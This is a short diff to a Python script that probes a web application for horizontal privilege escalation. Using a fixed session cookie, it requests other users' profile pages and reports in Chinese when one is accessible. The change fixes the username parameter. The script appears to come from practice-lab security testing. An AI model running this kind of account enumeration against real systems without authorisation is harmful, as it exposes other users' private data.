@@ -24,7 +24,7 @@ headers={"cookie":"PHPSESSID=kpvnp4ain20og4i55dahh08p92"}
 current_user="kobe"
 usernames=["vince","lucy","lili","allen","kevin"]
 for username in usernames:
-    params={"username":"username"}
+    params={"username":username}
     resp=requests.get(url,headers=headers,params=params)
     if username !=current_user and "欢迎来到个人信息中心" in resp.text:
         print(f"水平越权漏洞存在!可访问其他用户{username}的资料")
